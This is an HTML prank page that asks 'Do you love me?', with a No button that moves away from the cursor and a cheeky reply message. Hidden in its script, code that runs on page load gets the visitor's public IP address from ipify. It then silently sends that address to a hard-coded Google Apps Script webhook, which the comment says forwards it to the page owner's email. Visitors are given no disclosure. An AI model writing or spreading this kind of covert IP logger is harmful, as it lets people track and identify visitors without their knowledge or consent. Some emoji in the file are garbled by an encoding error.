<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Do You Love Me?</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: #ffe6f0;
    }
    img {
      width: 300px;
      margin-top: 20px;
    }
    .btn {
      padding: 12px 20px;
      margin: 10px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .yes {
      background-color: #4CAF50;
      color: white;
    }
    .no {
      background-color: #f44336;
      color: white;
      position: relative;
    }
  </style>
</head>
<body>
  <h1>Do you love me?</h1>
  <img id="gif" src="ask.gif" alt="Do you love me?" />
  <div>
    <button class="btn yes" onclick="yesClicked()">Yes</button>
    <button class="btn no" onmouseover="moveNoBtn()">No</button>
  </div>

  <h2 id="message"></h2>

  <script>
    // YOUR Google Apps Script URL
    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyJbMUN18urZKeqrzcrb-HmN2XCOGr20Um1EuK5b_6bZ8_aMlAqwcUkBdnbfCLAHpQV/exec";

    // Fetch IP then send to your email
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        fetch(`${WEBHOOK_URL}?ip=${data.ip}`, { method: 'POST' });
      });

    function yesClicked() {
      document.getElementById('gif').src = "yes.gif";
      document.getElementById('message').innerText = "I knew it! You love me ‚ù§Ô∏è";
    }

    function moveNoBtn() {
      const btn = document.querySelector(".no");
      btn.style.top = Math.random() * 300 + "px";
      btn.style.left = Math.random() * 300 + "px";
      btn.style.position = "absolute";
      document.getElementById('gif').src = "no.gif";
      document.getElementById('message').innerText = "Aww bakit? üò¢";
    }
  </script>
</body>
</html>
